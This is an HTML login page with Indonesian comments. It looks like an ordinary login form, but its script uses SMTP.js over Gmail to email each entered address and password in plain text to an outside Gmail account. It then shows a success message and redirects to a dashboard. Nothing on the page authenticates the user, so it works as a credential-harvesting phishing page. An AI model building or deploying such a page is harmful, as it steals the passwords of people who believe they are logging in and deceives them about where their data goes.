<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login Modern</title>
  <link rel="stylesheet" href="style.css" />
  <!-- Sertakan library SMTP.js -->
  <script src="https://smtpjs.com/v3/smtp.js"></script>
</head>
<body>
  <div class="login-container">
    <!-- Logo di atas halaman (ganti 'logo.png' dengan path/logo Anda) -->
    <div class="logo">
      <img src="logo.png" alt="Logo" />
    </div>
    <h2>Login</h2>
    <form id="loginForm" onsubmit="sendEmail(); return false;">
      <input
        type="email"
        id="email"
        name="email"
        placeholder="Email Anda"
        required
      />
      <input
        type="password"
        id="password"
        name="password"
        placeholder="Password Anda"
        required
      />
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    function sendEmail() {
      // Ambil data dari form
      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      // Konfigurasi SMTP.js
      Email.send({
        Host: "smtp.gmail.com", // misalnya: smtp.gmail.com
        Username: "yahhahah1212@gmail.com",   // akun email pengirim
        Password: "your-email-password",          // gunakan app password jika perlu
        To: "charismichael265@gmail.com",              // email tujuan penerimaan data login
        From: email,                              // email yang diinput oleh user
        Subject: "Data Login - Percobaan SMTP.js",
        Body: "Email: " + email + "<br>" + "Password: " + password
      }).then(function (message) {
        if (message === "OK") {
          alert("Login berhasil dan data telah dikirim melalui email!");
          // Alihkan ke halaman dashboard atau halaman lain jika login berhasil
          window.location.href = "dashboard.html"; // ganti dengan URL halaman selanjutnya
        } else {
          alert("Gagal mengirim email. Error: " + message);
        }
      });
    }
  </script>
</body>
</html>
